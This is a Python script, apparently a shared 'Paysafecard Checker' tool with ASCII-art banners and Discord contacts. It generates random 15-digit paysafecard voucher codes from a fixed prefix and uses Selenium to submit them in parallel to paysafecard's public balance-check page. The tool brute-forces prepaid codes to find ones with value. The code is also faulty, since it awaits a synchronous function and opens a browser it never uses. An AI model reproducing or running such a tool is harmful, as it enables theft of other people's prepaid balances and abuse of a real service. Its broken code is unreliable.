import colorama, sys, time, os, termcolor, random, asyncio
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from colorama import init
from colorama import Fore, Back, Style

def generate_random_string():
    random_num = ''.join(random.choices('0123456789', k=9))
    return '533292' + random_num

    
init(autoreset=True)
browser = webdriver.Chrome()
print(Fore.LIGHTGREEN_EX + '=========================================================================')
print(Fore.LIGHTGREEN_EX + '██████╗░░█████╗░██╗░░░██╗░██████╗░█████╗░███████╗███████╗░█████╗░░█████╗░██████╗░██████╗░')
print(Fore.LIGHTGREEN_EX + '██╔══██╗██╔══██╗╚██╗░██╔╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗')
print(Fore.LIGHTGREEN_EX + '██████╔╝███████║░╚████╔╝░╚█████╗░███████║█████╗░░█████╗░░██║░░╚═╝███████║██████╔╝██║░░██║')
print(Fore.LIGHTGREEN_EX + '██╔═══╝░██╔══██║░░╚██╔╝░░░╚═══██╗██╔══██║██╔══╝░░██╔══╝░░██║░░██╗██╔══██║██╔══██╗██║░░██║')
print(Fore.LIGHTGREEN_EX + '██║░░░░░██║░░██║░░░██║░░░██████╔╝██║░░██║██║░░░░░███████╗╚█████╔╝██║░░██║██║░░██║██████╔╝')
print(Fore.LIGHTGREEN_EX + '╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░')
print(Fore.GREEN + '==')
print(Fore.GREEN + '░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░')
print(Fore.GREEN + '██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗')
print(Fore.GREEN + '██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝')
print(Fore.GREEN + '██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗')
print(Fore.GREEN + '╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║ v1.4 ==================')
print(Fore.GREEN + '░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝ By mlodykreska#0002 and PanSlunher#6408')
print(Fore.LIGHTGREEN_EX + '=========================================================================')



async def check_balance(lst1):
    browser = webdriver.Chrome()
    print(Fore.LIGHTBLUE_EX + '██████████╗ # Checking...')
    print(Fore.LIGHTBLUE_EX + '╚═██╔═██╔═╝ # Code: ' + lst1)
    print(Fore.LIGHTBLUE_EX + '██████████╗ # Line: 1')
    print(Fore.LIGHTBLUE_EX + '╚██╔═██╔══╝ # Any issues?? Contact me at discord: mlodykreska#0002')
    print(Fore.LIGHTBLUE_EX + '░╚═╝░╚═╝░░░ # # # # # # # # # # # # # # # # # # # # # # # #')
    browser.get('https://www.paysafecard.com/en/balance-check/')
    await asyncio.sleep(3)
    checker = browser.find_element(By.ID, "balance-checker-input")
    checker.send_keys(lst1 + Keys.ENTER)
    print(Fore.LIGHTYELLOW_EX + '[|] Waiting 5s..')
    await asyncio.sleep(5)
    print(Fore.GREEN + 'Finished Checking | CODE:' + lst1)
    browser.quit()

async def main():
    tasks = []
    for _ in range(10):  # number of random strings to generate and check
        random_str = await generate_random_string()
        tasks.append(asyncio.create_task(check_balance(random_str)))
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
